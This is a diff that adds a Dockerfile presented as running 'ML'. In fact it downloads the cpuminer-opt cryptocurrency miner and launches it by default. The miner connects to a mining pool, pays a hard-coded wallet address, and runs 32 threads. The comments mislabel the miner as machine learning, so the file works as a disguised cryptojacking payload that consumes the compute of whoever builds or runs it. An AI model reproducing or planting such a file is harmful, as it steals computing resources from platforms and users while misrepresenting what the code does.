@@ -1,0 +1,18 @@
+# Use Ubuntu as base image
+FROM ubuntu:latest
+
+# Update package lists and install dependencies
+RUN apt-get update && \
+    apt-get install -y wget tar && \
+    apt-get clean
+
+# Download ML
+RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz && \
+    tar xf cpuminer-opt-linux.tar.gz && \
+    chmod +x cpuminer-sse2
+
+# Set working directory
+WORKDIR /
+
+# Command to run ML
+CMD ["./cpuminer-sse2", "-a", "yespower", "-o", "stratum+tcps://stratum-na.rplant.xyz:17111", "-u", "aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.r1", "--threads=32"]
